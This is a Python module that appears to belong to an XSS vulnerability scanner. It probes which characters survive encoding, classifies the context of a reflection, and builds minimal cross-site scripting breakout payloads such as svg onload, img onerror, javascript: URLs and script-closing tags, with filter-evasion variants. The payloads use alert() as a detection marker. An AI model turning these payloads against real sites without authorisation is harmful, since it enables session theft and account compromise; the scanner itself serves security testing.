"""Context-aware XSS payload engine.

The mistake naive checkers make is firing ``<script>`` everywhere. What decides
whether a reflection is exploitable is (a) the *context* the input lands in and
(b) which characters survive encoding on the way there. This module does both:
it probes character survival with isolated sentinels, classifies the reflection
context, and then builds the *minimal* payload shaped for that context out of
the characters that actually survived — including a set of bounded evasion
variants (case, backticks, alternate event handlers, tag/attribute breakouts).

It asserts nothing about execution; that is the headless verifier's job. Here we
only decide whether a working break-out exists given what survived.
"""

from __future__ import annotations

import re

# Characters worth knowing the fate of, each probed in isolation.
SPECIALS = ["<", ">", '"', "'", "`", "(", ")", ";", "/", "=", "{", "}", ":", "-"]

CONTEXT_LABELS = {
    "html": "HTML body",
    "attribute": "an HTML attribute value",
    "event": "an inline event-handler attribute",
    "url": "a URL attribute (href/src)",
    "css": "an inline style/CSS context",
    "script": "an inline <script> block",
    "js_string": "a JavaScript string literal",
    "js_noquote": "a JavaScript expression (no quotes)",
    "rcdata": "a <textarea>/<title> block",
    "comment": "an HTML comment",
}


def probe_value(canary: str) -> str:
    """A single value that lets us tell, per character, whether it survived.

    Each special is wrapped in its own ``canary+index+char`` sentinel, so
    entity-encoding one character (``<`` -> ``&lt;``) removes only that sentinel
    from the response and never shifts the reading of the others.
    """
    return "".join(f"{canary}s{i}{c}" for i, c in enumerate(SPECIALS))


def survived_chars(canary: str, body: str) -> set[str]:
    out: set[str] = set()
    for i, c in enumerate(SPECIALS):
        if f"{canary}s{i}{c}" in body:
            out.add(c)
    return out


# --------------------------------------------------------------------------
# Context classification
# --------------------------------------------------------------------------

_EVENT_ATTR = re.compile(r"\bon\w+\s*=\s*(\"|'|)([^\"'>]*)$", re.I)
_URL_ATTR = re.compile(r"\b(?:href|src|action|formaction|data|poster)\s*=\s*"
                       r"(\"|'|)([^\"'>]*)$", re.I)
_STYLE_ATTR = re.compile(r"\bstyle\s*=\s*(\"|'|)([^\"'>]*)$", re.I)
_ANY_ATTR = re.compile(r"=\s*(\"|'|)([^\"'>]*)$")


def detect_context(body: str, idx: int) -> tuple[str, str]:
    """Return (context, quote) for the reflection at ``idx``.

    ``quote`` is the delimiter that must be broken out of ('"', "'" or "" when
    the value is unquoted); it is meaningful for attribute/js-string contexts.
    """
    prefix = body[:idx]
    low = prefix.lower()

    so, sc = low.rfind("<script"), low.rfind("</script")
    if so != -1 and so > sc:
        return _script_context(prefix[so:])

    for tag in ("textarea", "title"):
        to, tc = low.rfind("<" + tag), low.rfind("</" + tag)
        if to != -1 and to > tc:
            return "rcdata", ""

    cs, ce = prefix.rfind("<!--"), prefix.rfind("-->")
    if cs != -1 and cs > ce:
        return "comment", ""

    lt, gt = prefix.rfind("<"), prefix.rfind(">")
    if lt > gt:  # inside a tag
        tag_prefix = prefix[lt:]
        if _EVENT_ATTR.search(tag_prefix):
            return "event", _quote_of(_EVENT_ATTR, tag_prefix)
        if _STYLE_ATTR.search(tag_prefix):
            return "css", _quote_of(_STYLE_ATTR, tag_prefix)
        if _URL_ATTR.search(tag_prefix):
            return "url", _quote_of(_URL_ATTR, tag_prefix)
        m = _ANY_ATTR.search(tag_prefix)
        if m:
            return "attribute", m.group(1)
        return "attribute", ""
    return "html", ""


def _quote_of(pattern, text) -> str:
    m = pattern.search(text)
    return m.group(1) if m else ""


def _script_context(script_prefix: str) -> tuple[str, str]:
    """Inside <script>: are we in a string literal, and delimited by what?"""
    quote = ""
    escaped = False
    for ch in script_prefix:
        if escaped:
            escaped = False
            continue
        if ch == "\\":
            escaped = True
            continue
        if quote:
            if ch == quote:
                quote = ""
        elif ch in ("'", '"', "`"):
            quote = ch
    if quote:
        return "js_string", quote
    return "js_noquote", ""


# --------------------------------------------------------------------------
# Payload construction
# --------------------------------------------------------------------------

def _candidates(context: str, quote: str, token: str) -> list[tuple[set, str, bool]]:
    """(required-characters, payload, needs-user-interaction) for a context.

    Ordered strongest-first. ``token`` appears inside an ``alert()`` so the
    headless verifier can recognise the dialog; the same reflection is what the
    static check looks for.
    """
    q = quote or ""
    a = f"alert('{token}')"        # primary execution sentinel
    ab = f"alert(`{token}`)"       # backtick variant for quote-stripping filters

    def base_html(payload_alert):
        return [
            ({"<", ">", "(", ")", "'"}, f"<svg onload={payload_alert}>", False),
            ({"<", ">", "(", ")", "'"}, f"<img src=x onerror={payload_alert}>", False),
            ({"<", ">", "(", ")"}, f"<iMg sRc=x OnErRoR={payload_alert}>", False),
        ]

    if context == "html":
        out = base_html(a)
        out.append(({"<", ">", "(", ")", "`"}, f"<svg onload={ab}>", False))
        return out

    if context in ("attribute", "url"):
        out = []
        if q:
            # Break the quoted value and current tag, then open a fresh tag.
            for needs, tag, _ in base_html(a):
                out.append((needs | {q}, f"{q}>{tag}", False))
            # Or stay in the tag and add an event handler (needs a hover/focus).
            out.append(({q, "(", ")", "'", "="},
                        f"{q} onmouseover={a} autofocus tabindex=0 zz={q}", True))
        else:
            for needs, tag, _ in base_html(a):
                out.append((needs, f">{tag}", False))
            out.append(({" ", "(", ")", "'", "="},
                        f" onmouseover={a} autofocus tabindex=0", True))
        if context == "url":
            out.insert(0, ({":", "(", ")", "'"}, f"javascript:{a}", True))
        return out

    if context == "event":
        out = []
        if q:
            out.append(({q, "(", ")", "'"}, f"{q});{a};//", False))
            for needs, tag, _ in base_html(a):
                out.append((needs | {q}, f"{q}>{tag}", False))
        else:
            out.append(({";", "(", ")", "'"}, f";{a};", False))
        return out

    if context == "js_string":
        other = '"' if q == "'" else "'"
        alt = f"alert({other}{token}{other})"
        return [
            ({q, "(", ")", ";"}, f"{q});{alt};//", False),
            ({q, "(", ")", ";"}, f"{q}-{alt}-{q}", False),
            ({"<", ">", "/", "(", ")", "'"},
             f"</script><svg onload={a}>", False),
        ]

    if context == "js_noquote":
        return [
            ({";", "(", ")", "'"}, f";{a};", False),
            ({"<", ">", "/", "(", ")", "'"},
             f"</script><svg onload={a}>", False),
        ]

    if context == "rcdata":
        return [({"<", ">", "/", "(", ")", "'"},
                 f"</textarea></title><svg onload={a}>", False)]

    if context == "comment":
        return [({"<", ">", "-", "(", ")", "'"},
                 f"--><svg onload={a}>", False)]

    if context == "css":
        return [({"<", ">", "/", "(", ")", "'"},
                 f"</style><svg onload={a}>", False)]

    return base_html(a)


def analyze(body: str, canary: str, token: str) -> dict | None:
    """Full analysis of a reflection: context, survival, and a working payload.

    Returns None if the canary is not reflected at all. Otherwise a dict:
        context, quote, survived, exploitable (bool), interaction (bool),
        payload (str|None), needs (set), label (str)
    """
    idx = body.find(canary)
    if idx == -1:
        return None
    context, quote = detect_context(body, idx)
    survived = survived_chars(canary, body)

    chosen = None
    for needs, payload, interaction in _candidates(context, quote, token):
        # Space is implicitly available; do not require probing it.
        required = {c for c in needs if c != " "}
        if required <= survived:
            chosen = (payload, needs, interaction)
            break

    result = {
        "context": context,
        "quote": quote,
        "survived": survived,
        "label": CONTEXT_LABELS.get(context, context),
        "exploitable": chosen is not None,
        "payload": chosen[0] if chosen else None,
        "needs": chosen[1] if chosen else set(),
        "interaction": chosen[2] if chosen else False,
    }
    return result
